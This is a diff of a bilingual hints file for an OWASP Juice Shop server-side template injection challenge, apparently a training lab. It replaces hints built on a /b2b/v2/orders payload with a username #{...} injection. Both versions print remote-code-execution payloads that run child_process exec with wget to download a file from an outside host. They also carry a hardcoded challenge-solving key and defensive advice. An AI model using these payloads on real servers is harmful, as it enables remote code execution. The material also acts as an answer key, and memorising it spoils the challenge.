@@ -67,52 +67,53 @@ hints:
   N4:
     cost_pct: 35
     text_fr: |
-      Le payload SSTI Node.js classique pour exec une commande
-      systeme via vm est : require('child_process').exec('cmd').
-      Pour ce challenge, exec doit lancer wget ou curl pour
-      telecharger juicy.efb depuis l'URL OWASP officielle (ou un
-      mirror local) puis le sauvegarder dans le folder du serveur.
-      Squelette du body JSON envoye a /b2b/v2/orders : un champ
-      contenant une expression template comme
-      orderLinesData = "<expression vm>".
+      Le point d'injection n'est pas /b2b/v2/orders : c'est le champ
+      username de ton profil. A l'affichage de /profile
+      (routes/userProfile.ts), si le username contient la syntaxe
+      #{...}, le serveur en extrait le contenu et l'EVALUE
+      (eval(code)). C'est une execution de code arbitraire cote
+      serveur. Y placer un require('child_process') permet de lancer
+      une commande systeme.
     text_en: |
-      Classic Node.js SSTI payload for system command execution
-      via vm: require('child_process').exec('cmd'). For this
-      challenge, exec must run wget or curl to download juicy.efb
-      from the official OWASP URL (or a local mirror) then save
-      it to the server folder. JSON body skeleton sent to
-      /b2b/v2/orders: a field containing a template expression
-      like orderLinesData = "<vm expression>".
+      The injection point is not /b2b/v2/orders: it is your profile's
+      username field. When /profile renders (routes/userProfile.ts), if
+      the username contains the #{...} syntax, the server extracts its
+      content and EVALUATES it (eval(code)). This is arbitrary server-
+      side code execution. Placing a require('child_process') there
+      lets you run a system command.
     pedagogical_intent: |
-      Spell the exec payload structure.
+      Correct the vector: SSTI via the profile username eval, not b2b.
 
   N5:
     cost_pct: 50
     text_fr: |
-      Cette quasi-solution depend de la version exacte de Juice
-      Shop installee. La forme generale du payload :
-      POST /b2b/v2/orders avec body
-      { "orderLinesData": "(function(){ require('child_process').
-      exec('wget https://download.vulnerabilities.io/juicy.efb -O
-      ./uploads/complaints/juicy.efb'); })()" }
-      Le serveur evalue le template, exec lance wget, juicy.efb
-      apparait dans le folder uploads. Le challenge se valide
-      automatiquement a la presence du fichier sur le filesystem.
-      Vrai test : verifie d'abord la version Juice Shop et
-      l'existence de l'endpoint /b2b/v2/orders dans ton instance.
-      Defense : (1) ne jamais passer des donnees utilisateur a vm.runInNewContext ou eval — utiliser un parser JSON strict pour les donnees B2B. (2) Desactiver le module child_process dans tout contexte sandbox. (3) Executer le traitement des commandes B2B dans un conteneur sans acces reseau sortant pour limiter l'impact d'un RCE.
+      Marche a suivre (vecteur confirme dans le code ; la chaine
+      complete de telechargement du malware n'a pas ete rejouee pour ne
+      pas executer de commande) :
+      1. Mets ton username (PUT /api/Users/<ton_id>) a une expression
+         #{...} qui telecharge le fichier attendu, par ex.
+         #{global.process.mainModule.require('child_process').exec('wget <url>/juicy.efb -O ...')}
+      2. Ouvre /profile : le serveur evalue le code, la commande
+         s'execute et positionne le drapeau abused_ssti_bug.
+      3. Declenche la validation :
+         GET /solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3
+         -> le serveur resout le challenge (verify.ts:93).
+      Defense : ne JAMAIS passer une entree utilisateur a eval ou a un
+      moteur de template cote serveur ; echapper/valider le username et
+      supprimer toute evaluation dynamique.
     text_en: |
-      This quasi-solution depends on the exact installed Juice
-      Shop version. General payload shape:
-      POST /b2b/v2/orders with body
-      { "orderLinesData": "(function(){ require('child_process').
-      exec('wget https://download.vulnerabilities.io/juicy.efb
-      -O ./uploads/complaints/juicy.efb'); })()" }
-      The server evaluates the template, exec runs wget, juicy.efb
-      appears in the uploads folder. The challenge solves
-      automatically once the file is on disk. Real test: first
-      verify your Juice Shop version and the existence of the
-      /b2b/v2/orders endpoint in your instance.
-      Defense: (1) never pass user data to vm.runInNewContext or eval — use a strict JSON parser for B2B order data. (2) Disable the child_process module in any sandbox context. (3) Run B2B order processing in a containerized environment with no outbound network access to limit RCE blast radius.
+      Procedure (vector confirmed in the code; the full malware-
+      download chain was not replayed to avoid running a command):
+      1. Set your username (PUT /api/Users/<your_id>) to a #{...}
+         expression that downloads the expected file, e.g.
+         #{global.process.mainModule.require('child_process').exec('wget <url>/juicy.efb -O ...')}
+      2. Open /profile: the server evaluates the code, the command runs
+         and sets the abused_ssti_bug flag.
+      3. Trigger validation:
+         GET /solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3
+         -> the server solves the challenge (verify.ts:93).
+      Defense: NEVER pass user input to eval or a server-side template
+      engine; escape/validate the username and remove any dynamic
+      evaluation.
     pedagogical_intent: |
-      Quasi-solution : full payload + version-dependency caveat.
+      Full chain with the correct vector, honest replay status, defense.
